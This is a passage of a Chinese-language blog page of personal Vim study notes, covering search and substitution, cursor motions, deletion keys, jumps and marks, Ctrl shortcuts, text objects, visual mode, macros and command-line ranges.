<code>#</code> 命令也使用了 “词首” 和”词尾” 标记来匹配整个单词 (要部分匹配，使用 <code>g*</code> 和 <code>g#</code>)</p><p><strong>大小写搜索</strong>: 在查找模式中加入 <code>\c</code> 表示大小写不敏感查找，<code>\C</code> 表示大小写敏感查找。</p><p><code>/foo\c</code></p><h2 id="搜索高亮"><a href="#搜索高亮" class="headerlink" title="搜索高亮"></a>搜索高亮</h2><p><code>gd</code>可以直接完成任务，使用<code>:noh</code>取消高亮。</p><h1 id="查找和替换"><a href="#查找和替换" class="headerlink" title="查找和替换"></a>查找和替换</h1><p>这个功能其实很难使用, 注意是因为命令太多了. </p><pre><code class="hljs">:s（substitute）命令用来查找和替换字符串。:&#123;作用范围&#125;s/&#123;目标&#125;/&#123;替换&#125;/&#123;替换标志&#125;</code></pre><p>例如 <code>:%s/foo/bar/g</code> 会在全局范围<code>(%)</code>查找 <code>foo</code> 并替换为 <code>bar</code>，所有出现都会被替换<code>（g）</code>。</p><h2 id="作用范围"><a href="#作用范围" class="headerlink" title="作用范围"></a>作用范围</h2><p>作用范围分为当前行、全文、选区等等。</p><p>当前行：</p><pre><code class="hljs">:s/foo/bar/g</code></pre><p>全文：</p><pre><code class="hljs">:%s/foo/bar/g</code></pre><p>选区，在 <code>Visual</code> 模式下选择区域后输入 :<code>，Vim</code> 即可自动补全为 :<code>&#39;&lt;,&#39;&gt;</code>。</p><pre><code class="hljs">:&#39;&lt;,&#39;&gt;s/foo/bar/g</code></pre><p><code>2-11</code> 行：</p><pre><code class="hljs">:5,12s/foo/bar/g</code></pre><p>当前行 <code>.</code> 与接下来两行 <code>+2</code>：</p><pre><code class="hljs">:.,+2s/foo/bar/g</code></pre><h2 id="替换标识符"><a href="#替换标识符" class="headerlink" title="替换标识符"></a>替换标识符</h2><h1 id="光标的移动"><a href="#光标的移动" class="headerlink" title="光标的移动"></a>光标的移动</h1><p>涉及的主要按键是：<br><code>$</code>：行尾<br><code>^</code>：软行首（就是不包括空格）<br><code>0</code>：硬行首（直接到真正的行首）<br><code>w/W</code>：下一个单词首<br><code>e/E</code>：下一个单词尾<br><code>ge</code>：g命令是一个附加命令，这个命令含义和<code>e</code>相反，移动到上一个单词尾<br><code>b/B</code>：上一个单词首<br><code>h</code>：左移一位<br><code>j</code>：下移一位<br><code>k</code>：上移一位<br><code>l</code>：左移一位<br><code>&#123;&#125;</code>：段首尾<br><code>H</code>：屏幕顶行<br><code>L</code>：屏幕底行<br><code>M</code>：屏幕中央<br><code>:10</code>： 移动光标到文件第 <code>10</code> 行。可以 <code>:set number</code> 来让 <code>vim</code> 显示行号。<br><code>zt</code>： 光标所在字符不动，将当前行移动到屏幕顶部，通常用来查看完整的下文，比如函数、类的定义。<br><code>zz</code>： 光标所在字符不动，将当前行移到屏幕中间。<br><code>zb</code>： 光标所在字符不动，将当前行移到屏幕底部。</p><p>软硬行首的区别</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs txt">          ^<br>     &lt;-----------x<br>.....This is a line with example text <br>&lt;----------------x   x--------------&gt;<br><br>        0                  $<br></code></pre></td></tr></table></figure><p><code>.....</code>表示空格</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404251954965.png"></p><h2 id="行内搜索"><a href="#行内搜索" class="headerlink" title="行内搜索"></a>行内搜索</h2><p>在行内使用搜索达到快速移动的目的。<br>行内搜索的按键是<code>f/F</code>其中<code>f</code>是向右搜索。<code>t/T</code>命令和<code>f/F</code>命令非常相似，其含义是<code>To</code>。它们唯一的不同是，<code>t/T</code>只会到达目标的前一个字符上。而<code>f/F</code>是直接到达该字符。</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">To err is human.  To really foul up you need a computer. <br>                 ---------------------&gt;<br>                          3fl<br></code></pre></td></tr></table></figure><h1 id="vim键盘图"><a href="#vim键盘图" class="headerlink" title="vim键盘图"></a>vim键盘图</h1><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202312090843302.png"></p><p>由图可知：</p><ul><li><code>g</code>和<code>z</code>是附加命令，也就是它们都需要和其他命令一起使用。</li><li><code>^</code>的含义是移动到软行首，而<code>0</code>是移动到硬行首。区别是<code>^</code>只是移动到这行的第一个字符处，而<code>0</code>是移动到真正的行首。与<code>0</code>相对应的是<code>$</code>，而不是<code>^</code>。</li><li><code>o</code>和<code>O</code>的作用分别是：向下起一行和向上起一行</li></ul><p><code>dd</code>和<code>cc</code>的关系是, 前者不会进入插入模式，但是后者会。两者都是删除的作用。</p><h2 id="操作符命令"><a href="#操作符命令" class="headerlink" title="操作符命令"></a>操作符命令</h2><p>上图中的橙色就是操作符命令。</p><p><strong>操作符 + 动作命令 &#x3D; 操作</strong></p><p>d{motion} 命令可以对一个字符（dl）、一个完整单词（daw）或一整个段落（dap）进行操作，它作用的范围由动作命令决定。c{motion}、y{motion}以及其他一些命令也类似，它们被统称为操作符（operator）。</p><p><strong>需要注意的是{motion}的含义就是文本对象，只有命令后面有这个{motion}则这个命令后面可以接上文本对象</strong></p><p>下图就是操作符表，包含了vim中的所有操作符。当然，我们可以定义自己的操作符，使用<code>h:map-operator</code>来查看相关信息。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402070121251.png"></p><p><strong>Vim的语法只有一条额外规则，即当一个操作符命令被连续调用两次时，它会作用于当前行。所以 dd 删除当前行，而 &gt;&gt; 缩进当前行。gU 命令是一种特殊情况，我们既可以用 gUgU ，也可以用简化版的 gUU 来使它作用于当前行。</strong></p><h3 id="操作符待决模式"><a href="#操作符待决模式" class="headerlink" title="操作符待决模式"></a>操作符待决模式</h3><p>结识操作符待决模式普通、插入及可视模式很容易辨识，但是Vim还有另外一些很容易被忽视的模式，操作符待决模式（Operator-Pending mode）就是一个例子。</p><p>每天我们无数次地使用它，但通常它只持续不到一秒时间。举个例子，在我们执行命令 dw 时，就会激活该模式。这一模式只在按 d 及 w 键之间的短暂时间间隔内存在，一眨眼工夫就不见了。</p><p>如果我们把Vim想象成有限状态机，那么操作符待决模式就是一个只接受动作命令的状态。这个状态在我们调用操作符时被激活，然后什么也不做，直到我们提供了一个动作命令，完成整个操作。当操作符待决模式被激活时，我们可以像平常一样按 <Esc> 中止该操作，返回到普通模式。</p><p>很多命令都由两个或更多的按键来调用（查阅<code>:h g</code>、<code>:h z</code>、<code>:h ctrl-w</code> ，或者<code>:h [</code>，可以看到一些例子），但在多数情况下，头一个按键只是第二个按键的前缀。这些命令不会激活操作符待决模式，相反，可以把它们当成命名空间（namespace），用来扩充可用命令的数目。只有操作符才会激活操作符待决模式。</p><p><strong>你也许想知道，为什么要有一个完整的模式，专门用于操作符和动作命令之间的短暂瞬间，而命名空间命令则仅仅是普通模式的一个扩充？</strong>好问题！这是因为我们能够创建自定义映射项来激活或终结操作符待决模式。<strong>换句话说，它允许我们创建自定义的操作符及动作命令，从而让我们可以扩充Vim的词汇。</strong></p><h2 id="在vim中删除的键有："><a href="#在vim中删除的键有：" class="headerlink" title="在vim中删除的键有："></a>在vim中删除的键有：</h2><p>其实就是sdcx四个键的大小写, d和c一组都是需要组合的键(但是这个两个将的大写是可以直接使用的), s和x一组是不需要组合的键</p><ol><li><code>x</code>相当于删除键.<code>X</code>相当于<code>退格键</code></li><li><code>cc</code>单个<code>c</code>键按了没有用必须要组合其他键. 使用这个可以删除一行并且不进入插入模式. </li><li><code>dd</code>这个作用和上面是一样的, 但是<code>dd</code>不会进入插入模式</li><li><code>s</code>删除光标处的字符, <code>S</code>是删除当前行然后进入插入模式</li><li>需要注意的是<code>c</code>和<code>d</code>单按都是没有用的. 必须组合, 模式是c\d+动作键(就是图中绿色的)<ol><li><code>cc</code></li><li><code>dd</code></li><li><code>cw</code> <code>c$</code></li><li><code>dw</code> <code>d^</code></li><li><code>c2h</code> 删除左侧的两个字符</li><li><code>d2l</code> 删除右侧的两个字符</li><li><code>df;</code> 向右删除到一个<code>;</code></li></ol></li><li><code>D</code>这个就是从当前光标删除到行尾, 不进入插入模式</li><li><code>C</code>和上面一样, 但是进入插入模式</li></ol><h2 id="移动键"><a href="#移动键" class="headerlink" title="移动键"></a>移动键</h2><p>+或Enter: 把光标移至下一行第一个非空白字符。   <br><br><br>-: 把光标移至上一行第一个非空白字符。   <br><br><br>w: 前移一个单词，光标停在下一个单词开头；   <br><br><br>W: 移动下一个单词开头，但<strong>忽略一些标点</strong>；   <br><br><br>e: 前移一个单词，光标停在下一个单词末尾；   <br><br><br>E: 移动到下一个单词末尾，如果词尾有标点，则<strong>移动到标点</strong>；   <br><br><br>b: 后移一个单词，光标停在上一个单词开头；   <br><br><br>B: 移动到上一个单词开头，<strong>忽略一些标点</strong>；   <br><br></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402180141585.png"></p><h1 id="vim中的跳转"><a href="#vim中的跳转" class="headerlink" title="vim中的跳转"></a>vim中的跳转</h1><p>一般，每次你执行一个会将光标移动到本行之外的命令，该移动即被称为一个 “跳转” 。这包括查找命令 “&#x2F;“ 和 “n” (无论跳转到多远的地方)。但不包括 “fx” 和 “tx” 这些行内查找命令或者 “w” 和 “e” 等词移动命令。另外 “j” 和 “k” 不会被当做是一次 “跳转”，即使你在前面加上计数前缀使之移动<br>到很远的地方也不例外。</p><p>由于 <code>jump list</code> 保留了光标的移动记录，我们可以通过 <code>:jumps</code> 查看 <code>jump list</code>，vim 会显示近 <code>100</code> 条记录；我们也可以可以在 <code>jump list</code> 中选中记录进行对应位置的跳转。</p><p>但是使用 <code>:jumps</code> 查看 <code>jump list</code> 来进行跳转的操作比较繁琐，而且很多时候我们并不关心之前这么多的跳转，我们只在乎跳转的顺序，因为只有顺着 <code>jump list</code> 的顺序，我们总会跳到想去的位置，这时我们可以使用以下命令：</p><pre><code class="hljs">    ctrl + i：跳转到 jump list 的后一个记录        ctrl + o：跳转到 jump list 的前一个记录</code></pre><p><strong>需要注意的是，jump list的存储对象是跳转，诸如<code>hjkl</code>这些移动命令并不是跳转。</strong></p><h2 id="类型跳转"><a href="#类型跳转" class="headerlink" title="类型跳转"></a>类型跳转</h2><p>使用<code>ctags filename</code>生成一个<code>tag</code>文件，然后就可以在目标文件中进行类型的跳转了使用<code>ctrl ]</code>使用<code>ctrl t</code>跳回来。</p><h2 id="文件跳转"><a href="#文件跳转" class="headerlink" title="文件跳转"></a>文件跳转</h2><p>使用<code>gf</code>跳转到文件，使用<code>ctrl o</code>回来。</p><h2 id="使用标记"><a href="#使用标记" class="headerlink" title="使用标记"></a>使用标记</h2><p><code>m&#123;a-zA-Z&#125;</code>命令会用选定的字母标记当前光标所在位置。小写位置标记只在每个缓冲区里局部可见，而大写位置标记则全局可见。</p><p>标号是全局的，只要使用vim创建的标号，不管在哪个文件使用命令<code>marks</code>都可以看到，并且可以直接使用<code>&#39;</code>来进行跳转。</p><p><code>m + [小写字母]</code>：只可在<strong>单个文件内</strong>跳转的标记；后面的为标记的标识符，用于跳转的指向；可以理解为当前标记的名字；下同<br><code>m + [大写字母]</code>：可在<strong>多个文件之间</strong>跳转的标记</p><p><code>mm</code> 和 <code>m</code> 命令是一对便于使用的命令，它们分别设置位置标记 m，以及跳转到该标记。</p><p><code>ma</code>使用<code>a</code>来表示这一行，跳转后可以使用<code>&#39;a</code>(注意是单引号)来跳转到这行，标号可以使用任意符号。</p><p>使用<code>:makes</code>查看所有的标号。注意这个</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402180005734.png"></p><p>删除标号：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">:delmarks name<br><br># 删除所有标号<br>:delmarks!<br></code></pre></td></tr></table></figure><h1 id="多文件操作"><a href="#多文件操作" class="headerlink" title="多文件操作"></a>多文件操作</h1><h2 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h2><p>修改了一个文件之后可以直接使用<code>:edit filename</code>修改下一个文件，但是这种方法会退出原本的文件。如果没有报错的话会报错，<code>:edit! filename</code>强制退出。</p><h2 id="文件列表"><a href="#文件列表" class="headerlink" title="文件列表"></a>文件列表</h2><p>使用命令<code>args</code>可以查看vim的参数，实际就是<code>vim filename1 filename2</code>。<br>可以使用这个命令打开多个文件:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">:args file1 file2 file3<br></code></pre></td></tr></table></figure><h2 id="文件杂项操作"><a href="#文件杂项操作" class="headerlink" title="文件杂项操作"></a>文件杂项操作</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim -R filename <span class="hljs-comment"># 以只读打开文件，但是仍然可以使用:w!强制修改</span><br>vim -M filename <span class="hljs-comment"># 以只读模式打开文件，无法强制修改</span><br></code></pre></td></tr></table></figure><h2 id="文件之间的移动"><a href="#文件之间的移动" class="headerlink" title="文件之间的移动"></a>文件之间的移动</h2><pre><code class="hljs">&lt;backspace&gt; 跳转到交替文件（上一个文件）。gt 跳转到下一个标签页。gT 跳转到上一个标签页。</code></pre><h1 id="ctrl快捷键"><a href="#ctrl快捷键" class="headerlink" title="ctrl快捷键"></a>ctrl快捷键</h1><h2 id="插入模式"><a href="#插入模式" class="headerlink" title="插入模式"></a>插入模式</h2><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">ctrl + k<br>键入二合字母<br>命令：dig可以查看所有的二合字母<br><br>ctrl + c/[<br>退出插入模式<br><br>ctrl + i<br>跳转到 jump list 的后一个记录<br><br>ctrl + o<br>跳转到 jump list 的前一个记录<br><br>**如 `j` `k` 一样， `i` `o` 的按键位置也是一样的规律：表示下一个在左，表示上一个的在右**<br><br>ctrl + r<br>后面跟寄存器名称，插入寄存器内容<br><br>ctrl + d<br>在当前行删除一个缩进，不论光标在哪<br><br>ctrl + t<br>在当前行插入一个缩进，不论光标在哪<br><br> <span class="hljs-number">0</span> + ctrl + d<br>删除当前行的所有缩进<br><br> ^ + ctrl + d<br>删除当前行的所有缩进，恢复下一行的缩进<br><br>ctrl + h<br>删除前一个字符<br><br>ctrl + w<br>删除光标前的单词<br><br>ctrl + u<br>删除至行尾<br><br>ctrl + m<br>回车<br><br>ctrl + e<br>插入光标下方的字符<br><br>ctrl + y<br>插入光标上方的字符<br></code></pre></td></tr></table></figure><h2 id="普通模式"><a href="#普通模式" class="headerlink" title="普通模式"></a>普通模式</h2><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs excel">ctrl + a<br>把 <span class="hljs-built_in">N</span> 加到光标所在/之后的数值上，默认加一<br><br>ctrl + x<br>把 <span class="hljs-built_in">N</span> 减到光标所在/之后的数值上，默认减一<br><br>ctrl + b<br>光标向上滚动一屏<br><br>ctrl + f<br>光标向下滚动一屏<br><br>ctrl + c<br>终止当前的 (搜索) 命令<br><br>ctrl + d<br>光标向下滚动半屏<br><br>ctrl + u<br>光标向上滚动半屏<br><br>ctrl + e<br>文本上滚 <span class="hljs-built_in">N</span> 行<br><br>ctrl + y<br>文本下滚 <span class="hljs-built_in">N</span> 行<br><br>ctrl + g<br>显示当前文件名和位置<br><br>ctrl + o/<span class="hljs-built_in">t</span><br>跳转到跳转表里第 <span class="hljs-built_in">N</span> 个较旧的位置<br><br>ctrl + i<br>跳转到跳转表里第 <span class="hljs-built_in">N</span> 个较新的位置<br><br>ctrl + r<br>重做 &#x27;u&#x27; 撤销的改变<br></code></pre></td></tr></table></figure><h1 id="文本对象"><a href="#文本对象" class="headerlink" title="文本对象"></a>文本对象</h1><p>vim中提供了文本对象，文本对象允许我们操作括号、被引用的文本、XML标签以及其他文本中的常见结构。</p><p>Vim 的文本对象分为两类：<strong>一类是操作分隔符的文本对象，如 i)、i” 和 it；另一类用于操作文本块，如单词、句子和段落。</strong></p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402070114400.png"></p><p>Vim 的文本对象由两个字符组成，第一个字符永远是 i 或是 a。我们一般说，以 i 开头的文本对象会选择分隔符内部的文本，而以 a 开头的文本对象则会选择包括分隔符在内的整个文本。为了便于记忆，可以把 i 想成“inside”，而把 a 想成“around”或“all”。</p><h2 id="分隔符文本对象"><a href="#分隔符文本对象" class="headerlink" title="分隔符文本对象"></a>分隔符文本对象</h2><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402070114075.png"></p><p>用文本对象执行操作可视模式适用于介绍文本对象，因为可以很容易看到发生的变化。然而，在操作符待决模式中使用文本对象，才能真正展现出它们的强大能力。文本对象自身并不是动作命令，我们不能用它们在文档中移动。但是我们却可以在可视模式及操作符待决模式中使用文本对象。</p><p><strong>记住：每当在命令语法里看到{motion} 时，你也可以在这个地方使用文本对象，常见的例子包括 d{motion}、c{motion}和 y{motion}（更多命令，请参见操作符命令表格）。</strong></p><h2 id="范围文本对象"><a href="#范围文本对象" class="headerlink" title="范围文本对象"></a>范围文本对象</h2><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402070144471.png"></p><p>范围文本对象主要是四种类型：</p><ul><li>word 单词</li><li>WORD 字串</li><li>句子</li><li>段落</li></ul><p>看看和分隔符文本对象相比，范围文本对象中的<code>a</code>和<code>i</code>有什么不同。</p><p>在分隔符文本对象中<code>i</code>代表的是不包括分隔符，而<code>a</code>则表示包括分隔符。</p><p>在范围文本对象中，<code>i</code>表示的是不包括范围文本两边的空格，而<code>a</code>则表示包括。</p><h2 id="两种文本对象的使用"><a href="#两种文本对象的使用" class="headerlink" title="两种文本对象的使用"></a>两种文本对象的使用</h2><p>实际上文本对象主要和操作符一起使用。</p><p>实列：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402070142855.png"></p><p>从上图可以知道，两种文本对象都需要跟在操作命令后面使用。</p><h1 id="可视模式"><a href="#可视模式" class="headerlink" title="可视模式"></a>可视模式</h1><p>vim中有三种可视模式可以使用：<code>v</code> <code>V</code> <code>Ctrl V</code></p><p>这个三种模式分别是单个字符选择模式、行选择模式、块&#x2F;列选择模式</p><p>使用<code>gv</code>可以重复选择上一次选中的字符</p><p><code> `&lt;</code>和<code> `&gt;</code> 前者是可以区域的开头，后者是结尾。<strong>这类表示范围的符号中，<code>&gt;</code>附近的符号都是在 <code>&lt;</code> 的右边</strong>如：</p><p><code> `&lt;</code> <code> \&lt;</code> <code> `&gt;</code> <code> \&gt;</code></p><p>在该模式下有些快捷键可以快速在选中的文本中<strong>再次选择文本</strong>，如：</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404282046378.png"></p><h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><ul><li><p>像大多数移动命令一样，<code>$</code>命令接受计数前缀。但是 “移动到一行的行尾 n 次”没有什么意义，所以它会使光标移动到另一行。例如，<code>1$</code> 移动到当前行的行尾，而<code>2$</code>则移动到下一行的行尾，如此类推。<br><code>0</code> 命令不能加计数前缀，因为 <code>0</code> 本身就是个数字。而且，出人意料地是，<code>^</code>命令使用计数前缀也没有任何效果。</p></li><li><p>当我们按错了某个命令想要退出时，<code>esc</code>可以退出大部分命令</p></li><li><p>使用<code>:help e37</code>直接查看e37错误码的帮助信息</p></li><li><p><code>!</code>一般表示强制操作，大多数命令可以在后面加上它一表示强制操作，如果在命令的<strong>前面</strong>使用 <code>!</code> 则表示运行 <code>shell</code> 中的命令</p></li><li><p><code>&lt;&lt;</code>和<code>&gt;&gt;</code> 前者是删除本行前的tab，后者是在本行添加一个tab。如果本行没有tab可供删除或者是已经有了tab则无法使用<code>&lt;&lt;</code>和<code>&gt;&gt;</code>。<code>&lt;</code>和<code>&gt;</code>可以在各个模式下使用，在可视模式下使用时可以快速添加tab。</p></li><li><p><code>cc</code>在普通模式下按这个可以进入插入模式并且会直接跳到和上下行一致的开头处。</p></li><li><p>先按<code>num+o</code>一个数字+<code>o</code>，然后输入文本可以将这个文本复制<code>num</code>遍，同样的使用<code>num+O</code>可以从上面开始插入<code>num</code>个</p></li><li><p><code>r</code>：替换当前光标下的字符，按下 <code>r</code>，然后输入一个字符，用来替换当前字符</p></li><li><p><code>A</code>：和<code>a</code>一样进入插入模式，但是是从句尾开始插入。</p></li><li><p><code>/</code> 称之为正斜线</p></li></ul><h1 id="常用快捷键"><a href="#常用快捷键" class="headerlink" title="常用快捷键"></a>常用快捷键</h1><ol><li><code>vip</code>选中一个段落</li><li>重复和后退<img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402220341622.png"></li><li>在vim中有文本行和屏幕行的区别，实际上这是因为文本行太长导致无法在屏幕上完整的显示，而将一个文本行拆分开来。在很多编译器中都没有这两个概念的区分，它们直接操作屏幕行。<br><br>实际上将原来操作文本行的命令：<code>h j k l </code>和<code>$ ^ 0</code>等等，加上一个<code>g</code>就变成了操作屏幕行，注意不可以一直按着<code>g</code>然后去按其他按键。</li><li><code>yy</code>和<code>Y</code>作用一致: 复制当前行</li><li><code>g_</code>到本行最后一个非 blank 字符的位置。</li><li><code>t</code>和<code>f</code>命令：<code>t&#123;char&#125;</code>和<code>f&#123;char&#125;</code>分别是查找字符<code>&#123;char&#125;</code>的左边界和右边界。同样的<code>T</code>和<code>F</code>命令也是查找字符<code>&#123;char&#125;</code>的左边界和右边界，但是是反向查找。<code>dt&quot;</code>删除至光标左边的双引号，<code>df)</code>删除至光标左边的右括号。</li><li>命令<code>ddp</code>可以快速交换两行。</li><li>命令<code>xp</code>可以交换两个字符。</li><li>命令<code>80ichar</code>可以插入80个字符。</li><li>在普通模式下使用 <code>K</code> 可以用 ‘keywordprg’ 程序 (缺省: “man”) 查光标下的关键字通过 <code>man</code> 命令快速搜索信息</li><li>使用 <code>J 可以快速连接两行，并且添加**空格**，使用 </code>gJ&#96; 可以合并两行，并且删除<strong>空格</strong>。</li><li><code>:qa</code> 退出 <code>Vim</code> 并放弃所有的更改。</li><li><code>:xa</code> 写入所有的更改并且退出</li><li><code>&#123;visual&#125;g?</code> 用 <code>rot13</code> 编码高亮的文本</li><li><code>N ]p</code> 同 <code>p</code>，但调整当前行的缩进，其中 <code>N</code>表示行数。所谓的调整缩进就是使用这个命令进行粘贴不会有缩进，但是使用<code>p</code>命令进行粘贴会有缩进。这个是在光标的上面粘贴。而命令 <code>N [</code>则是在光标的下面进行粘贴。</li><li><code>N gp</code> 同 <code>p</code>，但将光标留在新文本之后。其含义就是<strong>粘贴完之后光标会跳转到下一行的开头</strong>。</li><li>使用命令 <code>ctrl + x</code> 可以进行补全：<ol><li><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404271749721.png"></li></ol></li></ol><h1 id="宏"><a href="#宏" class="headerlink" title="宏"></a>宏</h1><p>vim中提供了一个<code>.</code>命令，这个命令可以理解位低级的宏。这<code>.</code>是重复上一次的操作，<strong>上一次的操作是从<code>normal</code>模式到<code>insert</code>模式之间所执行的操作</strong>。</p><p>vim还提供了宏，所谓的宏就是记录你在<code>normal</code>模式下的行为至寄存器中，然后可以重复使用。</p><p><code>q</code>+{a-zA-Z0-9}之间的一个字符，其实就是寄存器名称。</p><h2 id="如何使用宏"><a href="#如何使用宏" class="headerlink" title="如何使用宏"></a>如何使用宏</h2><p><code>q</code>键既是开始录制宏键，也是结束录制宏键</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202402220338975.png"></p><p>使用<code>:reg a(register name)</code>可以查看宏的内容。</p><p>通过<code>@a</code>执行录制的宏，使用<code>@@</code>执行最近使用过的宏</p><p>使用宏的时候尤其需要注意光标的位置，因为宏是从当前光标的位置开始执行的。所以我们需要在录制宏的时候就使用<code>$ ^ 0 </code>等等位移键控制好光标的位置。</p><p><code>22@q</code>将<code>q</code>中存储的宏执行<code>22</code>次。</p><h2 id="串行执行宏和并行执行宏"><a href="#串行执行宏和并行执行宏" class="headerlink" title="串行执行宏和并行执行宏"></a>串行执行宏和并行执行宏</h2><p>宏可以多次执行，但是一旦执行至某一次时出现了错误，如果是串行执行的话就会停下来，不在执行。如果是并行执行的话就会跳过错误继续执行。</p><p>如何并行执行：</p><p><code>:normal @q</code>在<code>v</code>模式下选中的代码中执行宏，此时就是并行执行宏，否则都是串行执行。</p><h2 id="给宏追加命令"><a href="#给宏追加命令" class="headerlink" title="给宏追加命令"></a>给宏追加命令</h2><p>有时候，我们在录制宏的过程中会漏掉某个至关重要的步骤。在这种情况下，我们没必要从头开始重录所有的步骤，而是可以在现有宏的结尾附加额外的命令。</p><p>如果我们使用<code>qa</code>来记录一个宏到<code>a</code>寄存器中，记录完成之后按下<code>q</code>退出，但是我们如果漏过一些命令此时可以使用<code>qA</code>来在该宏的最后面加上命令。</p><p>这个方法缺点明显，就是只可以在宏的后面进行添加命令。</p><p>还可以直接通过修改宏来达到目的：</p><ol><li><p>首先，我们按G键，跳到当前文档的结尾，目的是要把寄存器a中的内容粘贴至新的一行。处理这种情况最简单的方式是用 :put命令：➾:put a <br><br>为什么不直接用 “ap 命令呢？因为，在本例的上下文中，p命令会把寄存器a的内容粘贴至当前行的光标之后。而:put命令总会将它们粘贴至当前行的下方，无论寄存器保存的是面向行的还是面向字符的文本块。</p></li><li><p>现在我们可以像编辑普通文本一样编辑宏了。</p></li><li><p>我们依次运行命令 0 以及 “ay$，将把该行除回车符之外的每一个字符都复制下来。在把宏的内容保存回寄存器a之后，我们就可以用dd删除这一行了。尽管删除的内容最终将被保存到缺省寄存器，但我们也不会用到它们。<br><br>做完以上这些步骤，当前寄存器 a中保存着一个新的、改进的宏。我们可将其用于本节刚开始的示例文本。</p></li></ol><h1 id="命令模式"><a href="#命令模式" class="headerlink" title="命令模式"></a>命令模式</h1><p>在 Ex 命令影响范围广且距离远 中，我们已经了解了这个一般规律，即普通模式命令，适合在本地进行操作，而 Ex 命令则可以远距离操作。</p><p>在 <code>Vim</code> 中，有一种特殊的模式叫做命令行模式，它可以让我们输入一些命令，而无需离开当前模式。</p><p>这个模式下可以执行其他模式下的一些命令，但是这个模式的特点是适用于远距离的、长范围的情况。</p><p>使用<code>@:</code>可以重复执行上一次的命令。</p><p>其实命令行模式中的许多命令都是和普通模式中的命令效果是一样的。但是<strong>一般来说使用命令行模式会要快于直接使用命令模式</strong></p><p>直接进入 <code>Vim</code> 之后所在的模式就是命令行模式。</p><h2 id="显示命令-P"><a href="#显示命令-P" class="headerlink" title="显示命令 P"></a>显示命令 P</h2><p>这个命令其实是 <code>print</code> 命令的缩写，作用是打印当前行。</p><p>这个命令可以打印你给定范围中的文本，其中给定范围的方式可以是：</p><ul><li>行号范围：<code>10,20p</code></li><li>选择范围：<code>&#39;&lt;,&#39;&gt;p</code></li><li>正则表达式范围：<code>/(.*)/p</code></li></ul><p><strong>其一般的范围形式就是<code>&#123;start,end&#125;</code></strong></p><table><thead><tr><th>符号</th><th>功能</th></tr></thead><tbody><tr><td><code>.</code></td><td>代表当前行</td></tr><tr><td><code>$</code></td><td>代表当前行的结尾</td></tr><tr><td><code>%</code></td><td>代表整个文档</td></tr></tbody></table><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404252210670.png"></p><p>第 <code>0</code> 行在文件中并不真实存在，但它作为一个地址，在某些特定场景下会很有用处。特别是，在把指定范围内的行复制或移动到文件开头时，可以用它做 <code>:copy &#123;address&#125;</code> 及 <code>:move 